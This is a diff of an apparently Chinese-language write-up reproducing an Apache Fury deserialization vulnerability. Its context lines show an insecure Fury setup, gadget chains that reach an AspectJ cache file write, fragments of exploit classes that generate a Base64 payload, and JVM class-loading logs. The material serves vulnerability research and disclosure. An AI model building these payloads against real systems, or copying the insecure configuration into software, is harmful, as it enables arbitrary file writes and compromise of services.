@@ -50,21 +50,11 @@ Fury fury = Fury.builder()
     .requireClassRegistration(false)  // 允许反序列化未注册类
     .build();
 Object obj = fury.deserialize(Base64.getDecoder().decode(input));
-```
-
-
-
-```
 static void checkNotInDisallowedList(String clsName) {
     if (DEFAULT_DISALLOWED_LIST_SET.contains(clsName)) {
         throw new InsecureException(String.format("%s hit disallowed list", clsName));
     }
 }
-```
-
-
-
-```
 HashSet.readObject()
     HashMap.put()
         HashMap.hash()
@@ -74,11 +64,6 @@ HashSet.readObject()
                         SimpleCache$StorableCachingMap.put()
                             SimpleCache$StorableCachingMap.writeToPath()
                                 FileOutputStream.write()
-```
-
-
-
-```
 package reproduce;
 
 import org.apache.commons.collections.comparators.TransformingComparator;
@@ -162,11 +147,6 @@ public class ExpAspectJ {
         System.out.println("AspectJ Payload saved to payload_aj.b64");
     }
 }
-```
-
-
-
-```
 PriorityQueue.readObject()
   → heapify()
   → siftDown()
@@ -180,11 +160,6 @@ PriorityQueue.readObject()
   → factory.create()                    [ConstantFactory 返回预设的 byte[]]
   → StoreableCachingMap.put(key, value)
   → 写入文件 key，内容为 value
-```
-
-
-
-```
 2026-02-02 13:51:14 [Loaded java.util.concurrent.ThreadPoolExecutor$AbortPolicy from /usr/local/openjdk-8/jre/lib/rt.jar]
 2026-02-02 13:51:14 [Loaded java.util.concurrent.ThreadPoolExecutor$CallerRunsPolicy from /usr/local/openjdk-8/jre/lib/rt.jar]
 2026-02-02 13:51:14 [Loaded java.util.concurrent.ThreadPoolExecutor$DiscardOldestPolicy from /usr/local/openjdk-8/jre/lib/rt.jar]
@@ -205,11 +180,6 @@ PriorityQueue.readObject()
 2026-02-02 13:51:14 [Loaded org.jboss.threads.Waiter from file:/app/app.jar]
 2026-02-02 13:51:14 [Loaded java.util.concurrent.atomic.Striped64 from /usr/local/openjdk-8/jre/lib/rt.jar]
 2026-02-02 13:51:14 [Loaded java.util.concurrent.atomic.LongAdder from /usr/local/openjdk-8/jre/lib/rt.jar]
-```
-
-
-
-```
 package reproduce;
 
 import org.apache.fury.Fury;
